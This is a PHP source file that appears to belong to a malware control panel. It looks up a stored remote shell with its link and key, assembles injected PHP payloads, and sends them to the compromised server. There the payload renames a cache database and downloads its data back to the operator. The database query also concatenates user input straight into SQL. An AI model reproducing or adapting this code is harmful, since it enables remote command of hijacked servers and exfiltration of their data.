<?php

header('Content-type: text/plain');

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		header( 'Content-Disposition: attachment; filename="'.$result->id.'_'.time().'_data.bak.db"');
		if($Cur['str'] == 'cfile'){
			$get_php = '$cur_file = \''.$result->shell.'\';';
			$get_php .= '$data_file = \'data.bak.db\';';
			$get_php .= file_get_contents('modules/admins/injects/start.php');
			$get_php .= 'rename($dir . \'cache/data.db\', $dir . \'cache/data.bak.db\');';
			$get_php .= file_get_contents('modules/admins/injects/shever_dl.php');
			$ret = get_http($result->link, $get_php, $result->keyid, $result->shell);
			print($ret);
		}elseif($Cur['str'] == 'pfile'){
			$get_php = '$cur_file = \''.$result->shell.'\';';
			$get_php .= '$data_file = \'data.bak.db\';';
			$get_php .= file_get_contents('modules/admins/injects/start.php');
			$get_php .= file_get_contents('modules/admins/injects/shever_dl.php');
			$ret = get_http($result->link, $get_php, $result->keyid, $result->shell);
			print($ret);
		}
	}
}

exit;

?>